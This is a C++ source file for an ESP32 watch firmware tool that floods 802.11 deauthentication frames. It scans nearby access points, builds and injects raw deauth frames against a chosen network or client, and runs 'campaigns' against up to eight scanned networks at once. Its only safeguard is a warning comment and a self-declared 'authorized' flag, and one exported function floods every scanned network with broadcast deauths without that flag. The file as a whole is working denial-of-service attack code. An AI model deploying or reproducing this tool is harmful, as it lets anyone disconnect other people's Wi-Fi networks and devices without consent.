/**
 * @file      web_tool_deauthflood.cpp
 * @brief     Authorized 802.11 deauthentication test against a selected AP/station.
 *
 * WARNING: denial-of-service testing only on networks you own or have explicit
 * permission to test. Starting it disconnects the watch's normal Wi-Fi link.
 */
#include "web_tools.h"

#if FACTORY_WEB

#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <ctype.h>
#include <string>
#include <vector>
#include <mutex>

#ifdef ARDUINO
#include <WiFi.h>
#include <esp_wifi.h>
#include <esp_wifi_types.h>
#endif

#define DEAUTH_RADIO_OWNER "Deauth Flood"
#define DEAUTH_FRAME_SIZE 26
#define DEAUTH_CAMPAIGN_MAX 8
#define DEAUTH_TARGET_ERROR_LIMIT 25

enum deauth_campaign_state_t { DC_PENDING, DC_RUNNING, DC_DONE, DC_ERROR, DC_PMF_LIMITED };
typedef struct {
    char bssid[18];
    char station[18];
    char ssid[33];
    char auth[16];
    int channel;
    uint32_t goal;
    uint32_t accepted;
    uint32_t failed;
    uint32_t consecutive_errors;
    uint32_t started_ms;
    uint32_t elapsed_ms;
    deauth_campaign_state_t state;
    bool pmf_limited;
    char error[80];
} deauth_campaign_target_t;

static bool s_active = false;
static bool s_campaign_active = false;
static deauth_campaign_target_t s_campaign[DEAUTH_CAMPAIGN_MAX];
static int s_campaign_count = 0;
static int s_campaign_index = 0;
static uint32_t s_campaign_goal = 100;
static uint32_t s_reconnect_started_ms = 0;
static uint32_t s_reconnect_ms = 0;
static int s_reconnect_attempts = 0;
static bool s_reconnect_pending = false;
static bool s_reconnected = false;
static char s_target_bssid[18] = "";
static char s_target_station[18] = "ff:ff:ff:ff:ff:ff";
static char s_target_ssid[33] = "";
static int s_channel = 1;
static int s_rate_pps = 10;
static uint32_t s_sent = 0, s_tx_errors = 0;
static long long s_started = 0;
static uint32_t s_last_send_ms = 0, s_rate_fraction = 0;
static char s_error[160] = "";
#ifdef ARDUINO
static bool s_reconnect = false;
#endif

static void set_error(const char *text)
{
    snprintf(s_error, sizeof(s_error), "%s", text ? text : "");
}

static void reset_reconnect_metrics(void)
{
    s_reconnect_started_ms = s_reconnect_ms = 0;
    s_reconnect_attempts = 0;
    s_reconnect_pending = s_reconnected = false;
}

static void request_reconnect(void)
{
#ifdef ARDUINO
    if (s_reconnect) {
        s_reconnect_pending = true;
        s_reconnected = false;
        s_reconnect_attempts = 1;
        s_reconnect_started_ms = tools_now_ms();
        WiFi.reconnect();
    }
    s_reconnect = false;
#else
    s_reconnect_attempts = 1;
    s_reconnect_ms = 25;
    s_reconnected = true;
    s_reconnect_pending = false;
#endif
}

static bool mac_parse(const char *s, uint8_t mac[6])
{
    if (!s || strlen(s) != 17) return false;
    int v[6], used = 0;
    if (sscanf(s, "%x:%x:%x:%x:%x:%x%n", &v[0], &v[1], &v[2], &v[3], &v[4], &v[5], &used) != 6 || used != 17)
        return false;
    for (int i = 0; i < 6; i++) {
        if (v[i] < 0 || v[i] > 255) return false;
        mac[i] = (uint8_t)v[i];
    }
    return true;
}

static void mac_text(const uint8_t mac[6], char out[18])
{
    snprintf(out, 18, "%02x:%02x:%02x:%02x:%02x:%02x", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
}

static void build_deauth(uint8_t *frame, const uint8_t *dst, const uint8_t *src, uint16_t reason)
{
    memset(frame, 0, DEAUTH_FRAME_SIZE);
    frame[0] = 0xc0;
    memcpy(frame + 4, dst, 6);
    memcpy(frame + 10, src, 6);
    memcpy(frame + 16, src, 6);
    frame[24] = reason & 0xff;
    frame[25] = reason >> 8;
}

#ifdef ARDUINO
static void send_one(const uint8_t dst[6], const uint8_t src[6])
{
    uint8_t frame[DEAUTH_FRAME_SIZE];
    build_deauth(frame, dst, src, 0x07);
    frame[22] = s_sent & 0xff;
    frame[23] = (s_sent >> 8) & 0xff;
    esp_err_t rc = esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), false);
    if (rc == ESP_OK) s_sent++;
    else {
        s_tx_errors++;
        if (s_tx_errors == 1 || s_tx_errors % 20 == 0) {
            char b[80];
            snprintf(b, sizeof(b), "Frame injection failed: %s", esp_err_to_name(rc));
            set_error(b);
        }
    }
}

static void send_cycle(void)
{
    uint8_t bssid[6], station[6];
    if (!mac_parse(s_target_bssid, bssid)) return;
    static const uint8_t bcast[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
    if (strcmp(s_target_station, "ff:ff:ff:ff:ff:ff") && mac_parse(s_target_station, station)) {
        send_one(station, bssid);
        send_one(bssid, station);
    } else {
        send_one(bcast, bssid);
    }
}
#endif

/* ---------------------------------------------------------------- target scan (asynchronous) */

static std::vector<web_hw_wifi_t> s_scan_targets;
static std::mutex s_scan_mx;
static bool s_scan_running = false;
static char s_scan_error[96] = "";

static void scan_task(void *)
{
    std::vector<web_hw_wifi_t> aps;
    bool ok = web_hw_wifi_scan(aps);
    {
        std::lock_guard<std::mutex> lk(s_scan_mx);
        if (ok) s_scan_targets = aps;
        s_scan_running = false;
        snprintf(s_scan_error, sizeof(s_scan_error), "%s", ok ? "" : "Wi-Fi scan failed; try again");
    }
    tools_wifi_release(DEAUTH_RADIO_OWNER);
}

static int begin_scan(std::string &error)
{
    if (s_active || s_campaign_active) { error = "Stop Deauth Flood before scanning"; return 409; }
    {
        std::lock_guard<std::mutex> lk(s_scan_mx);
        if (s_scan_running) return 0;               /* join the scan in progress */
    }
    if (!tools_wifi_claim(DEAUTH_RADIO_OWNER, error)) return 503;
    {
        std::lock_guard<std::mutex> lk(s_scan_mx);
        s_scan_running = true;
        s_scan_error[0] = 0;
    }
    web_plat_spawn(scan_task, NULL);
    return 0;
}

/* ---------------------------------------------------------------- lifecycle */

static int begin_flood(const char *bssid_text, const char *station_text, int channel, int rate)
{
    if (s_active || s_campaign_active) { set_error("Deauth test already running"); return 409; }
    uint8_t bssid[6], station[6];
    if (!mac_parse(bssid_text, bssid)) { set_error("BSSID must be six hex octets (aa:bb:cc:dd:ee:ff)"); return 400; }
    const char *station_in = station_text && *station_text ? station_text : "ff:ff:ff:ff:ff:ff";
    if (!mac_parse(station_in, station)) { set_error("Station must be a MAC address or ff:ff:ff:ff:ff:ff"); return 400; }
    if (channel < 1 || channel > 13) { set_error("Channel must be 1-13"); return 400; }
    if (rate < 1 || rate > 100) { set_error("Rate must be 1-100 packets/s"); return 400; }

    std::string radio_error;
    if (!tools_wifi_claim(DEAUTH_RADIO_OWNER, radio_error)) { set_error(radio_error.c_str()); return 503; }
    set_error("");
    mac_text(bssid, s_target_bssid);
    mac_text(station, s_target_station);
    s_target_ssid[0] = 0;
    {
        std::lock_guard<std::mutex> lk(s_scan_mx);
        for (const auto &ap : s_scan_targets) {
            if (!strcasecmp(ap.bssid, s_target_bssid)) {
                snprintf(s_target_ssid, sizeof(s_target_ssid), "%s", ap.ssid);
                break;
            }
        }
    }
    s_channel = channel;
    s_rate_pps = rate;
    s_sent = s_tx_errors = 0;
    s_campaign_count = 0;
    reset_reconnect_metrics();
    s_started = tools_epoch();
    s_last_send_ms = 0;
    s_rate_fraction = 0;

#ifdef ARDUINO
    s_reconnect = WiFi.status() == WL_CONNECTED;
    WiFi.disconnect(false, false);
    esp_wifi_set_promiscuous(false);
    esp_err_t rc = esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    if (rc != ESP_OK) {
        tools_wifi_release(DEAUTH_RADIO_OWNER);
        if (s_reconnect) WiFi.reconnect();
        set_error("Wi-Fi could not select the target channel");
        return 500;
    }
#endif
    s_active = true;
    return 0;
}

static void finish_flood(void)
{
    if (s_campaign_active) {
        s_campaign_active = false;
        tools_wifi_release(DEAUTH_RADIO_OWNER);
        request_reconnect();
    }
    if (!s_active) return;
    s_active = false;
    tools_wifi_release(DEAUTH_RADIO_OWNER);
    request_reconnect();
}

/* ---------------------------------------------------------------- bounded multi-target campaigns */

static int campaign_completed(void)
{
    int done = 0;
    for (int i = 0; i < s_campaign_count; i++) if (s_campaign[i].state >= DC_DONE) done++;
    return done;
}

static const char *campaign_state_name(deauth_campaign_state_t state)
{
    switch (state) {
        case DC_RUNNING: return "running";
        case DC_DONE: return "done";
        case DC_ERROR: return "error";
        case DC_PMF_LIMITED: return "pmf_limited";
        default: return "pending";
    }
}

static void campaign_sync_legacy(void)
{
    if (s_campaign_index < 0 || s_campaign_index >= s_campaign_count) return;
    const deauth_campaign_target_t &t = s_campaign[s_campaign_index];
    snprintf(s_target_bssid, sizeof(s_target_bssid), "%s", t.bssid);
    snprintf(s_target_station, sizeof(s_target_station), "%s", t.station);
    snprintf(s_target_ssid, sizeof(s_target_ssid), "%s", t.ssid);
    s_channel = t.channel;
}

static void campaign_advance(void);

static void campaign_finish_target(deauth_campaign_state_t state, const char *error = NULL)
{
    if (!s_campaign_active || s_campaign_index < 0 || s_campaign_index >= s_campaign_count) return;
    deauth_campaign_target_t &t = s_campaign[s_campaign_index];
    t.state = state;
    t.elapsed_ms = tools_now_ms() - t.started_ms;
    if (error) snprintf(t.error, sizeof(t.error), "%s", error);
    campaign_advance();
}

static void campaign_activate_next(void)
{
    while (s_campaign_active && s_campaign_index < s_campaign_count) {
        deauth_campaign_target_t &t = s_campaign[s_campaign_index];
        if (t.state != DC_PENDING) { s_campaign_index++; continue; }
        campaign_sync_legacy();
        t.started_ms = tools_now_ms();
        t.state = DC_RUNNING;
        s_last_send_ms = 0;
        s_rate_fraction = 0;
#ifdef ARDUINO
        esp_err_t rc = esp_wifi_set_channel(t.channel, WIFI_SECOND_CHAN_NONE);
        if (rc != ESP_OK) { campaign_finish_target(DC_ERROR, "Could not select target channel"); continue; }
#endif
        return;
    }
    if (s_campaign_active) finish_flood();
}

static void campaign_advance(void)
{
    s_campaign_index++;
    campaign_activate_next();
}

static bool parse_campaign_targets(const std::string &body, std::vector<std::string> &out, std::string &error)
{
    out.clear();
    size_t key = body.find("\"targets\"");
    if (key == std::string::npos) { error = "targets must be an array of scanned BSSIDs"; return false; }
    size_t i = body.find(':', key + 8);
    if (i == std::string::npos) return false;
    i++;
    auto ws = [&]() { while (i < body.size() && isspace((unsigned char)body[i])) i++; };
    ws();
    if (i >= body.size() || body[i++] != '[') { error = "targets must be an array"; return false; }
    ws();
    if (i < body.size() && body[i] == ']') { error = "Select at least one target"; return false; }
    while (i < body.size()) {
        if (body[i++] != '"') { error = "Every target must be a BSSID string"; return false; }
        std::string mac;
        bool closed = false;
        while (i < body.size()) {
            unsigned char c = body[i++];
            if (c == '"') { closed = true; break; }
            if (c == '\\' || c < 0x20) { error = "BSSIDs must be plain MAC strings"; return false; }
            mac += (char)c;
        }
        uint8_t parsed[6];
        if (!closed || !mac_parse(mac.c_str(), parsed)) { error = "Invalid target BSSID"; return false; }
        for (const std::string &old : out) if (!strcasecmp(old.c_str(), mac.c_str())) { error = "Duplicate target BSSID"; return false; }
        if (out.size() >= DEAUTH_CAMPAIGN_MAX) { error = "At most 8 campaign targets"; return false; }
        out.push_back(mac);
        ws();
        if (i < body.size() && body[i] == ',') { i++; ws(); continue; }
        if (i < body.size() && body[i] == ']') return true;
        error = "Expected ',' or ']' after target"; return false;
    }
    error = "Unterminated target array";
    return false;
}

static int begin_campaign(const std::vector<std::string> &bssids, const char *station_text, int frames, int rate)
{
    if (s_active || s_campaign_active) { set_error("Deauth test already running"); return 409; }
    if (bssids.empty() || bssids.size() > DEAUTH_CAMPAIGN_MAX) { set_error("Select 1-8 targets"); return 400; }
    if (frames < 1 || frames > 100000) { set_error("Frames per target must be 1-100000"); return 400; }
    if (rate < 1 || rate > 100) { set_error("Rate must be 1-100 packets/s"); return 400; }
    const char *station_in = station_text && *station_text ? station_text : "ff:ff:ff:ff:ff:ff";
    uint8_t station[6];
    if (!mac_parse(station_in, station)) { set_error("Invalid station MAC"); return 400; }

    memset(s_campaign, 0, sizeof(s_campaign));
    s_campaign_count = (int)bssids.size();
    int usable = 0;
    {
        std::lock_guard<std::mutex> lk(s_scan_mx);
        for (int i = 0; i < s_campaign_count; i++) {
            const web_hw_wifi_t *found = NULL;
            for (const auto &ap : s_scan_targets) if (!strcasecmp(ap.bssid, bssids[i].c_str())) { found = &ap; break; }
            if (!found) { set_error("Every campaign BSSID must come from the latest scan"); return 400; }
            deauth_campaign_target_t &t = s_campaign[i];
            snprintf(t.bssid, sizeof(t.bssid), "%s", found->bssid);
            snprintf(t.station, sizeof(t.station), "%s", station_in);
            snprintf(t.ssid, sizeof(t.ssid), "%s", found->ssid);
            snprintf(t.auth, sizeof(t.auth), "%s", found->auth ? found->auth : "unknown");
            t.channel = found->channel;
            t.goal = (uint32_t)frames;
            t.pmf_limited = strstr(t.auth, "wpa3") != NULL;
            t.state = DC_PENDING;
            if (t.channel >= 1 && t.channel <= 13) usable++;
            else { t.state = DC_ERROR; snprintf(t.error, sizeof(t.error), "Only 2.4 GHz channels 1-13 are supported"); }
        }
    }
    if (!usable) { set_error("No selected target is on a supported 2.4 GHz channel"); return 400; }
    std::string radio_error;
    if (!tools_wifi_claim(DEAUTH_RADIO_OWNER, radio_error)) { set_error(radio_error.c_str()); return 503; }
    set_error("");
    s_campaign_goal = (uint32_t)frames;
    s_campaign_index = 0;
    s_rate_pps = rate;
    s_sent = s_tx_errors = 0;
    s_started = tools_epoch();
    reset_reconnect_metrics();
#ifdef ARDUINO
    s_reconnect = WiFi.status() == WL_CONNECTED;
    WiFi.disconnect(false, false);
    esp_wifi_set_promiscuous(false);
#endif
    s_campaign_active = true;
    campaign_activate_next();
    return 0;
}

static void campaign_send_cycle(void)
{
#ifdef ARDUINO
    if (!s_campaign_active || s_campaign_index < 0 || s_campaign_index >= s_campaign_count) return;
    deauth_campaign_target_t &t = s_campaign[s_campaign_index];
    uint8_t bssid[6], station[6];
    if (!mac_parse(t.bssid, bssid)) { campaign_finish_target(DC_ERROR, "Invalid target BSSID"); return; }
    static const uint8_t bcast[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
    int frames = strcmp(t.station, "ff:ff:ff:ff:ff:ff") && mac_parse(t.station, station) ? 2 : 1;
    for (int i = 0; i < frames; i++) {
        uint32_t old_sent = s_sent, old_errors = s_tx_errors;
        if (frames == 2) send_one(i ? bssid : station, i ? station : bssid);
        else send_one(bcast, bssid);
        if (s_sent != old_sent) { t.accepted++; t.consecutive_errors = 0; }
        else if (s_tx_errors != old_errors) {
            t.failed++; t.consecutive_errors++;
            if (t.consecutive_errors >= DEAUTH_TARGET_ERROR_LIMIT) {
                campaign_finish_target(DC_ERROR, "Injection failed repeatedly; target skipped"); return;
            }
        }
        if (t.accepted >= t.goal) {
            campaign_finish_target(t.pmf_limited ? DC_PMF_LIMITED : DC_DONE);
            return;
        }
    }
#else
    deauth_campaign_target_t &t = s_campaign[s_campaign_index];
    uint32_t add = s_rate_pps / 20 + 1;
    if (add > t.goal - t.accepted) add = t.goal - t.accepted;
    t.accepted += add;
    s_sent += add;
    if (t.accepted >= t.goal) campaign_finish_target(t.pmf_limited ? DC_PMF_LIMITED : DC_DONE);
#endif
}

static void campaign_fail_current(const char *reason)
{
    if (!s_campaign_active || s_campaign_index < 0 || s_campaign_index >= s_campaign_count) return;
    deauth_campaign_target_t &t = s_campaign[s_campaign_index];
    t.failed++;
    s_tx_errors++;
    campaign_finish_target(DC_ERROR, reason);
}

/* ---------------------------------------------------------------- API */

static const char *const APPS[] = { "Deauth Flood", NULL };

static void status_json(web_req_t *r)
{
    std::string j = std::string("{\"active\":") + ((s_active || s_campaign_active) ? "true" : "false") +
        ",\"targetBssid\":";
    web_json_str(j, s_target_bssid);
    j += ",\"targetStation\":";
    web_json_str(j, s_target_station);
    j += ",\"targetSsid\":";
    web_json_str(j, s_target_ssid);
    j += ",\"channel\":" + tools_int(s_channel) +
        ",\"sent\":" + tools_int(s_sent) +
        ",\"txErrors\":" + tools_int(s_tx_errors) +
        ",\"ratePps\":" + tools_int(s_rate_pps) +
        ",\"started\":" + tools_int(s_started) + ",\"error\":";
    if (s_error[0]) web_json_str(j, s_error); else j += "null";
    j += ",\"reconnect\":{\"pending\":" + std::string(s_reconnect_pending ? "true" : "false") +
        ",\"reconnected\":" + std::string(s_reconnected ? "true" : "false") +
        ",\"attempts\":" + tools_int(s_reconnect_attempts) + ",\"elapsedMs\":" + tools_int(s_reconnect_ms) + "}";
    j += ",\"campaign\":{\"active\":" + std::string(s_campaign_active ? "true" : "false") +
        ",\"current\":" + tools_int(s_campaign_index) + ",\"completed\":" + tools_int(campaign_completed()) +
        ",\"count\":" + tools_int(s_campaign_count) + ",\"framesPerTarget\":" + tools_int(s_campaign_goal) + "}";
    j += ",\"progress\":[";
    for (int i = 0; i < s_campaign_count; i++) {
        const deauth_campaign_target_t &t = s_campaign[i];
        if (i) j += ",";
        j += "{\"ssid\":"; web_json_str(j, t.ssid);
        j += ",\"bssid\":"; web_json_str(j, t.bssid);
        j += ",\"station\":"; web_json_str(j, t.station);
        j += ",\"channel\":" + tools_int(t.channel) + ",\"auth\":"; web_json_str(j, t.auth);
        j += ",\"state\":"; web_json_str(j, campaign_state_name(t.state));
        j += ",\"accepted\":" + tools_int(t.accepted) + ",\"failed\":" + tools_int(t.failed) +
            ",\"goal\":" + tools_int(t.goal) + ",\"elapsedMs\":" + tools_int(t.elapsed_ms) +
            ",\"pmfLimited\":" + std::string(t.pmf_limited ? "true" : "false") + ",\"error\":";
        if (t.error[0]) web_json_str(j, t.error); else j += "null";
        j += "}";
    }
    j += "]}";
    web_resp_json(r, 200, j);
}

static void start_flood(web_req_t *r)
{
    if (tools_busy(r, APPS)) return;
    std::string body, bssid, station;
    double channel = 1, rate = 10;
    if (!tools_read_json(r, body)) return;
    web_json_get_str(body, "bssid", bssid);
    web_json_get_str(body, "station", station);
    if (web_json_has(body, "channel") && !web_json_get_num(body, "channel", &channel)) {
        web_resp_error(r, 400, "bad_request", "channel must be a number"); return;
    }
    if (web_json_has(body, "rate") && !web_json_get_num(body, "rate", &rate)) {
        web_resp_error(r, 400, "bad_request", "rate must be a number"); return;
    }
    bool approved = false;
    if (!web_json_get_bool(body, "authorized", &approved) || !approved) {
        web_resp_error(r, 400, "authorization_required", "Confirm that you own or may test this network"); return;
    }
    int rc = begin_flood(bssid.c_str(), station.c_str(), (int)channel, (int)rate);
    if (rc) web_resp_error(r, rc, rc == 400 ? "bad_request" : rc == 409 ? "conflict" : rc == 503 ? "busy" : "internal", s_error);
    else web_resp_ok(r);
}

static void start_campaign(web_req_t *r)
{
    if (tools_busy(r, APPS)) return;
    std::string body, station, parse_error;
    double frames = 100, rate = 10;
    if (!tools_read_json(r, body)) return;
    bool approved = false;
    if (!web_json_get_bool(body, "authorized", &approved) || !approved) {
        web_resp_error(r, 400, "authorization_required", "Confirm every selected lab target is authorized"); return;
    }
    web_json_get_str(body, "station", station);
    if (web_json_has(body, "frames") && !web_json_get_num(body, "frames", &frames)) {
        web_resp_error(r, 400, "bad_request", "frames must be a number"); return;
    }
    if (web_json_has(body, "rate") && !web_json_get_num(body, "rate", &rate)) {
        web_resp_error(r, 400, "bad_request", "rate must be a number"); return;
    }
    std::vector<std::string> targets;
    if (!parse_campaign_targets(body, targets, parse_error)) {
        web_resp_error(r, 400, "bad_request", parse_error.c_str()); return;
    }
    int rc = begin_campaign(targets, station.c_str(), (int)frames, (int)rate);
    if (rc) web_resp_error(r, rc, rc == 400 ? "bad_request" : rc == 409 ? "conflict" : rc == 503 ? "busy" : "internal", s_error);
    else web_resp_ok(r, ("\"active\":" + std::string(s_campaign_active ? "true" : "false")).c_str());
}

static void stop_flood(web_req_t *r)
{
    finish_flood();
    web_resp_ok(r);
}

static void scan_targets(web_req_t *r)
{
    if (tools_busy(r, APPS)) return;
    std::string error;
    int rc = begin_scan(error);
    if (rc) web_resp_error(r, rc, rc == 409 ? "conflict" : "busy", error.c_str());
    else web_resp_json(r, 202, "{\"ok\":true}");
}

static void list_targets(web_req_t *r)
{
    std::lock_guard<std::mutex> lk(s_scan_mx);
    std::string j = std::string("{\"scanning\":") + (s_scan_running ? "true" : "false") + ",\"error\":";
    if (s_scan_error[0]) web_json_str(j, s_scan_error); else j += "null";
    j += ",\"targets\":[";
    for (size_t i = 0; i < s_scan_targets.size(); i++) {
        if (i) j += ",";
        j += "{\"ssid\":";
        web_json_str(j, s_scan_targets[i].ssid);
        j += ",\"bssid\":";
        web_json_str(j, s_scan_targets[i].bssid);
        j += ",\"channel\":" + tools_int(s_scan_targets[i].channel) +
            ",\"rssi\":" + tools_int(s_scan_targets[i].rssi) + ",\"auth\":";
        web_json_str(j, s_scan_targets[i].auth ? s_scan_targets[i].auth : "other");
        j += "}";
    }
    j += "]}";
    web_resp_json(r, 200, j);
}

static bool handle(web_req_t *r)
{
#ifndef ARDUINO
    if (tools_is(r, "POST", "/api/_dev/deauthflood")) {
        std::string body, action;
        if (!tools_read_json(r, body)) return true;
        web_json_get_str(body, "action", action);
        if (action == "fail-target") {
            if (!s_campaign_active) web_resp_error(r, 409, "conflict", "no campaign target is running");
            else { campaign_fail_current("Simulator injection failure"); web_resp_ok(r); }
            return true;
        }
        int rc = begin_flood("02:00:00:00:00:01", "ff:ff:ff:ff:ff:ff", 1, 10);
        if (rc) web_resp_error(r, rc, rc == 503 ? "busy" : "conflict", s_error);
        else web_resp_ok(r);
        return true;
    }
#endif
    if (strcmp(r->path, "/api/deauthflood") && strncmp(r->path, "/api/deauthflood/", 17)) return false;
    if (tools_is(r, "GET", "/api/deauthflood")) status_json(r);
    else if (tools_is(r, "POST", "/api/deauthflood/start")) start_flood(r);
    else if (tools_is(r, "POST", "/api/deauthflood/campaign/start")) start_campaign(r);
    else if (tools_is(r, "POST", "/api/deauthflood/stop") || tools_is(r, "POST", "/api/deauthflood/campaign/stop")) stop_flood(r);
    else if (tools_is(r, "POST", "/api/deauthflood/scan")) scan_targets(r);
    else if (tools_is(r, "GET", "/api/deauthflood/targets")) list_targets(r);
    else web_resp_error(r, 404, "not_found");
    return true;
}

static void deauth_tick(uint32_t now_ms)
{
#ifdef ARDUINO
    if (s_reconnect_pending) {
        if (WiFi.status() == WL_CONNECTED) {
            s_reconnect_pending = false;
            s_reconnected = true;
            s_reconnect_ms = now_ms - s_reconnect_started_ms;
        } else if (now_ms - s_reconnect_started_ms >= 20000) {
            s_reconnect_pending = false;
            s_reconnect_ms = now_ms - s_reconnect_started_ms;
        } else if (s_reconnect_attempts < 3 && now_ms - s_reconnect_started_ms >= (uint32_t)s_reconnect_attempts * 5000) {
            s_reconnect_attempts++;
            WiFi.reconnect();
        }
    }
#endif
    if (!s_active && !s_campaign_active) return;
#ifdef ARDUINO
    if (!s_last_send_ms) s_last_send_ms = now_ms;
    uint32_t elapsed = now_ms - s_last_send_ms;
    if (elapsed < 50) return;
    s_last_send_ms = now_ms;
    if (elapsed > 250) elapsed = 250;             /* no unbounded burst after a blocked UI loop */
    s_rate_fraction += elapsed * (uint32_t)s_rate_pps;
    int cycles = 0;
    while (s_rate_fraction >= 1000 && cycles++ < 25 && (s_active || s_campaign_active)) {
        s_rate_fraction -= 1000;
        if (s_campaign_active) campaign_send_cycle(); else send_cycle();
    }
    if (s_campaign_active && s_campaign_index >= 0 && s_campaign_index < s_campaign_count)
        s_campaign[s_campaign_index].elapsed_ms = now_ms - s_campaign[s_campaign_index].started_ms;
#else
    (void)now_ms;
    if (s_campaign_active) campaign_send_cycle(); else s_sent += s_rate_pps / 20 + 1;
#endif
}

static void deauth_stop(void) { finish_flood(); }

bool web_hw_deauthflood_start(const char *bssid, const char *station, int channel, int rate)
{
    return begin_flood(bssid, station, channel, rate) == 0;
}
bool web_hw_deauthflood_stop(void) { finish_flood(); return true; }
bool web_hw_deauthflood_campaign_start_all(int frames, int rate)
{
    std::vector<std::string> targets;
    {
        std::lock_guard<std::mutex> lk(s_scan_mx);
        for (const auto &ap : s_scan_targets) {
            if (targets.size() >= DEAUTH_CAMPAIGN_MAX) break;
            targets.push_back(ap.bssid);
        }
    }
    return begin_campaign(targets, "ff:ff:ff:ff:ff:ff", frames, rate) == 0;
}
void web_hw_deauthflood_status(web_hw_deauthflood_t *out)
{
    if (!out) return;
    memset(out, 0, sizeof(*out));
    out->active = s_active || s_campaign_active;
    snprintf(out->target_bssid, sizeof(out->target_bssid), "%s", s_target_bssid);
    snprintf(out->target_station, sizeof(out->target_station), "%s", s_target_station);
    snprintf(out->target_ssid, sizeof(out->target_ssid), "%s", s_target_ssid);
    out->channel = s_channel;
    out->sent_count = s_sent;
    out->tx_errors = s_tx_errors;
    out->campaign_count = s_campaign_count;
    out->campaign_completed = campaign_completed();
    out->campaign_current = s_campaign_index;
    out->reconnect_attempts = s_reconnect_attempts;
    out->reconnect_ms = s_reconnect_ms;
    out->rate_kbps = (uint32_t)s_rate_pps;       /* legacy field name; value is packets/s */
    out->started_epoch = s_started;
    out->error = s_error[0] ? s_error : NULL;
}
int web_hw_deauthflood_scan_targets(void)
{
    std::string error;
    begin_scan(error);
    return web_hw_deauthflood_target_count();
}
bool web_hw_deauthflood_scanning(void)
{
    std::lock_guard<std::mutex> lk(s_scan_mx);
    return s_scan_running;
}
int web_hw_deauthflood_target_count(void)
{
    std::lock_guard<std::mutex> lk(s_scan_mx);
    return (int)s_scan_targets.size();
}
const char *web_hw_deauthflood_target_ssid(int i)
{
    std::lock_guard<std::mutex> lk(s_scan_mx);
    return i >= 0 && i < (int)s_scan_targets.size() ? s_scan_targets[i].ssid : "";
}
const char *web_hw_deauthflood_target_bssid(int i)
{
    std::lock_guard<std::mutex> lk(s_scan_mx);
    return i >= 0 && i < (int)s_scan_targets.size() ? s_scan_targets[i].bssid : "";
}
int web_hw_deauthflood_target_channel(int i)
{
    std::lock_guard<std::mutex> lk(s_scan_mx);
    return i >= 0 && i < (int)s_scan_targets.size() ? s_scan_targets[i].channel : 0;
}
int web_hw_deauthflood_target_rssi(int i)
{
    std::lock_guard<std::mutex> lk(s_scan_mx);
    return i >= 0 && i < (int)s_scan_targets.size() ? s_scan_targets[i].rssi : 0;
}
const char *web_hw_deauthflood_target_auth(int i)
{
    std::lock_guard<std::mutex> lk(s_scan_mx);
    return i >= 0 && i < (int)s_scan_targets.size() && s_scan_targets[i].auth ? s_scan_targets[i].auth : "other";
}

static const char *const CAPS[] = { "deauth.flood", "deauth.campaign", "deauth.health", NULL };
const web_tool_t web_tool_deauthflood = { CAPS, handle, deauth_tick, NULL, deauth_stop };

#else
const web_tool_t web_tool_deauthflood = { NULL, NULL, NULL, NULL, NULL };
#endif
